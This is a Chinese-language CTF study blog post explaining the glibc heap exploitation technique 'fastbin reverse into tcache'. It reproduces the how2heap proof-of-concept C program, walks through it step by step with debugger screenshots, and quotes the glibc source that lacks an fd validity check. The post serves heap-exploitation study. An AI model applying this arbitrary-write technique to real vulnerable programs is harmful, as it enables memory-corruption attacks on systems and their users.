
---
title:  how2heap-fastbin_reverse_into_tcache-学习
categories: [CTF]
tags: [pwn]

---
`fastbin reverse into tcache`是指利用tcache为空而fastbin不为空，堆管理把fashbin放入tcahe时进行的攻击。`fastbin reverse into tcache`一度感觉很鸡肋，但仔细看大佬分析后，发现是我态年轻了，理解不到位。<!--more-->

## 目的

1.让任意地址进入tcache中，再取出tcache进行任意地址写。

2.对任意一个地址，写入一个可控的堆上地址。

## 条件

1.能反复创建释放14个以上的fastbin。

2.能修改其中一个fastbin的fd

3.用tcache机制



## 分析how2heap源码

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

const size_t allocsize = 0x40;

int main(){
  setbuf(stdout, NULL);

  printf(
    "\n"
    "This attack is intended to have a similar effect to the unsorted_bin_attack,\n"
    "except it works with a small allocation size (allocsize <= 0x78).\n"
    "The goal is to set things up so that a call to malloc(allocsize) will write\n"
    "a large unsigned value to the stack.\n\n"
  );

  // Allocate 14 times so that we can free later.
  char* ptrs[14];
  size_t i;
  for (i = 0; i < 14; i++) {
    ptrs[i] = malloc(allocsize);
  }

  printf(
    "First we need to free(allocsize) at least 7 times to fill the tcache.\n"
    "(More than 7 times works fine too.)\n\n"
  );

  // Fill the tcache.
  for (i = 0; i < 7; i++) {
    free(ptrs[i]);
  }

  char* victim = ptrs[7];
  printf(
    "The next pointer that we free is the chunk that we're going to corrupt: %p\n"
    "It doesn't matter if we corrupt it now or later. Because the tcache is\n"
    "already full, it will go in the fastbin.\n\n",
    victim
  );
  free(victim);

  printf(
    "Next we need to free between 1 and 6 more pointers. These will also go\n"
    "in the fastbin. If the stack address that we want to overwrite is not zero\n"
    "then we need to free exactly 6 more pointers, otherwise the attack will\n"
    "cause a segmentation fault. But if the value on the stack is zero then\n"
    "a single free is sufficient.\n\n"
  );

  // Fill the fastbin.
  for (i = 8; i < 14; i++) {
    free(ptrs[i]);
  }

  // Create an array on the stack and initialize it with garbage.
  size_t stack_var[6];
  memset(stack_var, 0xcd, sizeof(stack_var));

  printf(
    "The stack address that we intend to target: %p\n"
    "It's current value is %p\n",
    &stack_var[2],
    (char*)stack_var[2]
  );

  printf(
    "Now we use a vulnerability such as a buffer overflow or a use-after-free\n"
    "to overwrite the next pointer at address %p\n\n",
    victim
  );

  //------------VULNERABILITY-----------

  // Overwrite linked list pointer in victim.
  *(size_t**)victim = &stack_var[0];

  //------------------------------------

  printf(
    "The next step is to malloc(allocsize) 7 times to empty the tcache.\n\n"
  );

  // Empty tcache.
  for (i = 0; i < 7; i++) {
    ptrs[i] = malloc(allocsize);
  }

  printf(
    "Let's just print the contents of our array on the stack now,\n"
    "to show that it hasn't been modified yet.\n\n"
  );

  for (i = 0; i < 6; i++) {
    printf("%p: %p\n", &stack_var[i], (char*)stack_var[i]);
  }

  printf(
    "\n"
    "The next allocation triggers the stack to be overwritten. The tcache\n"
    "is empty, but the fastbin isn't, so the next allocation comes from the\n"
    "fastbin. Also, 7 chunks from the fastbin are used to refill the tcache.\n"
    "Those 7 chunks are copied in reverse order into the tcache, so the stack\n"
    "address that we are targeting ends up being the first chunk in the tcache.\n"
    "It contains a pointer to the next chunk in the list, which is why a heap\n"
    "pointer is written to the stack.\n"
    "\n"
    "Earlier we said that the attack will also work if we free fewer than 6\n"
    "extra pointers to the fastbin, but only if the value on the stack is zero.\n"
    "That's because the value on the stack is treated as a next pointer in the\n"
    "linked list and it will trigger a crash if it isn't a valid pointer or null.\n"
    "\n"
    "The contents of our array on the stack now look like this:\n\n"
  );

  malloc(allocsize);

  for (i = 0; i < 6; i++) {
    printf("%p: %p\n", &stack_var[i], (char*)stack_var[i]);
  }

  char *q = malloc(allocsize);
  printf(
    "\n"
    "Finally, if we malloc one more time then we get the stack address back: %p\n",
    q
  );

  assert(q == (char *)&stack_var[2]);

  return 0;
}
```

执行审计与调试下来，可以发现其实流程十分简单：

先创建14个能进入fastbin大小的chunk，然后先释放其中7个

```c
  char* ptrs[14];
  size_t i;
  for (i = 0; i < 14; i++) {
    ptrs[i] = malloc(allocsize);
  }

  printf(
    "First we need to free(allocsize) at least 7 times to fill the tcache.\n"
    "(More than 7 times works fine too.)\n\n"
  );

  // Fill the tcache.
  for (i = 0; i < 7; i++) {
    free(ptrs[i]);
  }
```

这样就将tcache填满了。

然后重点来了，我们记录下attack chunk(第8个被释放chunk(也就是第一个加入fashbin的chunk

)的指针。

![image-20220618185010440](image-20220618185010440.png)然后再释放掉所用的chunk,让它们全部加入fastbin。

```c
  char* victim = ptrs[7];

  free(victim);
  // Fill the fastbin.
  for (i = 8; i < 14; i++) {
    free(ptrs[i]);
  }
```

然后获取栈上地址为目标写入地址，同时将attack chunk的fd改为目标写入地址-0x10的地址：

```c
  // Create an array on the stack and initialize it with garbage.
  size_t stack_var[6];
  memset(stack_var, 0xcd, sizeof(stack_var));

  // Overwrite linked list pointer in victim.
  *(size_t**)victim = &stack_var[0];

```

创造7个chunk 让tcache 清空.

![image-20220618185047126](image-20220618185047126.png)

```c
  // Empty tcache.
  for (i = 0; i < 7; i++) {
    ptrs[i] = malloc(allocsize);
  }

  malloc(allocsize);
```

这时，再创一个chunk 就可以看到攻击完成attack chunk 的 fd 对应地址+0x10变成一个fake chunk的进入 tcache 首。

![image-20220618185221433](image-20220618185221433.png)

在与之同时，将 fd 对应地址的值，加入到原本大小fastbin 中

并且，在攻击完成前：

![image-20220618185120234](image-20220618185120234.png)

在攻击完成后：

![image-20220618185244042](image-20220618185244042.png)

对照可以发现，攻击完成，同时在目标写入地址 写入了attack chunk 地址和key的值。

## 攻击实现的glibc原理

```c
/* While we're here, if we see other chunks of the same size,
 stash them in the tcache.  */
size_t tc_idx = csize2tidx (nb);
if (tcache && tc_idx < mp_.tcache_bins) //判定tcache为空，同时fastbin有chunk
{
    mchunkptr tc_victim;
    /* While bin not empty and tcache not full, copy chunks.  */
    while (tcache->counts[tc_idx] < mp_.tcache_count //判断tache 是否满
         && (tc_victim = *fb) != NULL)//判定上一个fastbin 的fd是否为空
    {
        if (SINGLE_THREAD_P)
            *fb = tc_victim->fd;//获取fastbin 的fd
        else
        {
            REMOVE_FB (fb, pp, tc_victim);
            if (__glibc_unlikely (tc_victim == NULL))
                break;
        }
        tcache_put (tc_victim, tc_idx);
    }
}
```

在tcache为空而fastbin不为空，堆管理把fashbin放入tcahe时，会按照fashbin被使用的顺序将fashbin一个取出分析（即后进先出的原理）。这时，我们的attack chunk第一个进入fastbin，那么它将会最后一个出来。同时，这个代码对fastbin 加入 tachae 的依据是tache 是否填满和上个fastbin 的fd指针，并未判断fd的合法性，导致我们可以伪造fd来让第7个进入 tachae  的chunk被我们控制，而不影响堆管理逻辑顺序。

## 参考文献

https://bbs.pediy.com/thread-272884.htm